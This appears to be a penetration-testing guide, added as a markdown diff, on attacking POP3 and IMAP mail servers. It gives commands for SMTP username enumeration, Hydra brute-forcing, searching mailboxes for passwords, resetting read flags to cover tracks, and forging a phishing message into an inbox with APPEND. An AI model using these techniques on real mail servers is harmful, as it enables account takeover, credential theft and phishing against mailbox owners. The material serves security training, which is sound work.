@@ -1,0 +1,177 @@
+---
+title: "Email Enumeration & Manipulation (POP3 / IMAP)"
+---
+
+<Info>
+**What they are**
+
+POP3 and IMAP are the two protocols a mail client uses to **read** mail *from* a server. They're the receiving half of email; **SMTP** is the sending half (see [SMTP Status Code Cheat Sheet](/enumeration/smtp-status-code-cheat-sheet)). A real mailbox is a high-value target because it routinely holds passwords, password-reset links, internal documents, and VPN configs — anything a person has ever emailed themselves or been sent.
+</Info>
+
+---
+
+## How email actually moves, and where POP3/IMAP fit
+
+Email has two distinct jobs, and they use different protocols:
+
+- **Sending / relaying** is done by **SMTP**. When you hit send, your client hands the message to an SMTP server, which relays it toward the recipient's mail server. SMTP only ever pushes mail *outward* and between servers.
+- **Reading** is done by **POP3** or **IMAP**. Once a message has landed in a mailbox on the recipient's server, the recipient's client connects with POP3 or IMAP to pull it down and display it.
+
+So on a full mail host you'll typically see **SMTP (25) + POP3/IMAP (110/143)** all open together. That combination is ideal for an attacker: use SMTP to *enumerate which usernames exist*, then use IMAP/POP3 to *read those users' mail* once you have credentials.
+
+### POP3 vs IMAP — two very different models
+
+The difference matters for what you can do once you're in:
+
+- **POP3 (Post Office Protocol v3)** is the older, simpler model: it was designed to **download mail to one device and delete it from the server**. It only ever sees the main **INBOX** — no server-side folders, no flags, no search. Think "grab everything and go."
+- **IMAP (Internet Message Access Protocol)** keeps mail **on the server** and syncs it across many devices. It supports **folders, read/unread flags, and server-side search**. That makes IMAP the richer target — you can browse every folder, search thousands of messages for "password", and even forge messages into a mailbox.
+
+Both come in a plaintext flavour and an SSL/TLS flavour:
+
+| Protocol | Plaintext | SSL/TLS |
+|----------|-----------|---------|
+| POP3 | 110 | 995 |
+| IMAP | 143 | 993 |
+
+<Info>
+**How to spot them on a scan**
+
+Banners from `nmap -sV` say `pop3` / `imap`. The capability scripts list what each server supports (look for `LOGIN`, `STARTTLS`):
+```bash
+sudo nmap -sV -p 110,143,993,995 --script "pop3-capabilities,imap-capabilities" <IP>
+```
+Seeing 25 alongside 110/143 means a full mail host — enumerate users over SMTP first, then read their mail here.
+</Info>
+
+---
+
+## Step 0: Enumerate valid usernames over SMTP
+
+Before you can read or brute-force a mailbox you need to know *which accounts exist*. POP3/IMAP won't tell you — they just reject bad logins. But the **SMTP** server sitting on port 25 will, because of how it was designed to validate recipients. SMTP has three verbs that, on a misconfigured server, confirm whether a username is real:
+
+- **`VRFY <user>`** — literally "verify this user exists." The server answers differently for valid vs invalid accounts.
+- **`EXPN <list>`** — expands a mailing list into its members.
+- **`RCPT TO:<user>`** — during a fake message, the server accepts the recipient if the mailbox exists and rejects it if not. This is the most reliable method because `VRFY`/`EXPN` are often disabled.
+
+The attack works because the server's *response code differs* for real vs fake users (e.g. `250 OK` vs `550 no such user`). You diff those responses to build a list of valid accounts — which then feeds the Hydra brute-force and, once you have a password, the IMAP/POP3 read below.
+
+```bash
+# Manual check with netcat
+nc <IP> 25
+VRFY root
+VRFY nonexistentuser123
+# Compare the two response codes — a difference means VRFY leaks valid users
+```
+
+```bash
+# Automated with smtp-user-enum (tries each name and reports which the server accepts)
+smtp-user-enum -M VRFY -U users.txt -t <IP>
+smtp-user-enum -M RCPT -U users.txt -t <IP>   # fall back to RCPT if VRFY is disabled
+smtp-user-enum -M RCPT -U users.txt -D domain -t <IP> #we can add -D for domain
+```
+
+`-M` picks the verb (`VRFY`, `EXPN`, or `RCPT`); `-U` is your candidate username list; `-t` is the target. See [SMTP Status Code Cheat Sheet](/enumeration/smtp-status-code-cheat-sheet) for what each response code means.
+
+---
+
+## Connecting by hand
+
+Both protocols are plain-text line protocols, so you can drive them manually with `nc` (or `openssl` for the encrypted ports) and type commands directly — useful for understanding what's happening and for poking at a server before you script anything.
+
+```bash
+# Plaintext
+nc <IP> 110          # POP3
+nc <IP> 143          # IMAP
+
+# Encrypted (use these when only 993/995 are open, or to upgrade a plain port)
+openssl s_client -connect <IP>:995                    # POP3S
+openssl s_client -connect <IP>:110 -starttls pop3     # upgrade plain POP3 to TLS
+openssl s_client -connect <IP>:143 -starttls imap     # upgrade plain IMAP to TLS
+```
+
+---
+
+## Driving POP3
+
+POP3 is a simple stateful conversation: authenticate, then list and retrieve. Remember it only sees the INBOX, and any messages you `DELE` are actually removed when you `QUIT`.
+
+```text
+USER username      # 1. specify the account
+PASS password      # 2. authenticate
+STAT               # 3. total message count + mailbox size
+LIST               # 4. list every message with its size (pick targets)
+TOP 1 0            # 5. show ONLY the headers of message 1 (stealthy — doesn't pull the body)
+RETR 1             # 6. retrieve the full headers + body of message 1
+DELE 1             # 7. mark message 1 for deletion
+QUIT               # 8. close — deletions are committed here
+```
+
+`TOP n 0` is worth knowing: it returns a message's headers without retrieving the body, so you can triage what's worth reading without leaving a "fully fetched" footprint.
+
+---
+
+## Driving IMAP
+
+IMAP works differently in two ways: every command must be prefixed with a **tag** (any short token like `a1`, `a2` — it's how the client matches responses to requests), and it exposes **folders**, so you must `SELECT` a mailbox before reading from it.
+
+```text
+a1 LOGIN user pass     # 1. authenticate
+a2 LIST "" "*"         # 2. list ALL folders (custom/hidden folders are where the good stuff hides)
+a3 SELECT "INBOX"      # 3. open a folder before reading from it
+a4 FETCH 1 BODY[]      # 4. read the full content of message 1
+a5 FETCH 1 (FLAGS)     # 5. check a message's flags (e.g. \Seen = already read)
+```
+
+Because IMAP is server-side and searchable, it supports operations POP3 can't — searching, hiding your tracks, and even injecting mail:
+
+```text
+# Find credentials across an entire large mailbox in one query:
+a6 SEARCH TEXT "password"
+
+# Cover your tracks — mark a message you read back as Unread:
+a7 STORE 1 -FLAGS (\Seen)
+
+# Delete and permanently purge a message:
+a8 STORE 1 +FLAGS (\Deleted)
+a9 EXPUNGE
+
+# Forge a message straight into the mailbox (e.g. plant a phishing link):
+# {52} is the exact byte length of the literal that follows, INCLUDING the \r\n line endings.
+a10 APPEND INBOX {52}
+Subject: Fake Email
+Here is the malicious link.
+```
+
+<Tip>
+**What to actually do once you're in**
+
+Run `a6 SEARCH TEXT "password"` immediately — mailboxes are full of plaintext credentials, reset links, and internal system details. Then reuse anything you find against other services (SSH, VPN, AD). The `APPEND` forgery and `STORE -FLAGS \Seen` tricks are for manipulation/cover scenarios, not everyday recon.
+</Tip>
+
+---
+
+## Brute-forcing credentials with Hydra
+
+If you don't have creds yet (and you've enumerated likely usernames via SMTP), Hydra speaks both protocols directly.
+
+```bash
+# Plaintext ports
+hydra -l <username> -P passwords.txt -t 4 <IP> pop3 -V
+hydra -L users.txt   -P passwords.txt -t 4 <IP> imap -V
+
+# SSL/TLS ports — add -S and point -s at the secure port
+hydra -l <username> -P passwords.txt -S -s 995 -t 4 <IP> pop3 -V
+hydra -l <username> -P passwords.txt -S -s 993 -t 4 <IP> imap -V
+```
+
+- `-l` single username / `-L` username list; `-P` password list.
+- `-t 4` runs 4 parallel tasks — mail servers throttle aggressively, so if connections start dropping, drop to `-t 1`.
+- `-S` switches to SSL; `-s` sets the explicit port; `-V` prints each attempt.
+
+---
+
+## Defensive notes (for the report)
+
+- Disable the plaintext ports (110/143) and force SSL/TLS (993/995) so credentials and mail aren't sniffable.
+- Enforce strong passwords and connection rate-limiting / lockout to blunt Hydra-style brute-forcing.
+- Don't store secrets in mail; mailboxes become a single point of compromise for reused passwords and reset links.
